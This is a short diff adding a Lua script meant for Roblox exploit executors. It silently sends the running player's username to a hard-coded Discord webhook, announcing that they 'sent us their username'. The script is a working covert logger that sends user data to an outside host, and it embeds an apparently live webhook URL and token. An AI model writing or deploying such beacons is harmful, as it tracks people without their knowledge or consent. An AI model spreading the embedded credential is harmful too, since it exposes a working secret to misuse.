@@ -1,0 +1,11 @@
+local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+httprequest({
+  Url = 'https://discord.com/api/webhooks/1346708757853372456/fUgC5ZIX1t9miqp0C3kjH0GE3zfNDgEEUHUy-Kz6JGECdcvdYFK8iZPWA6YicH1ytz-2',
+  Method = "POST",
+  Headers = {
+    ["Content-Type"] = "application/json"
+  },
+  Body = game:GetService("HttpService"):JSONEncode({
+    ["content"] = game.Players.LocalPlayer.Name..' executed/sent us their username!!'
+  })
+})
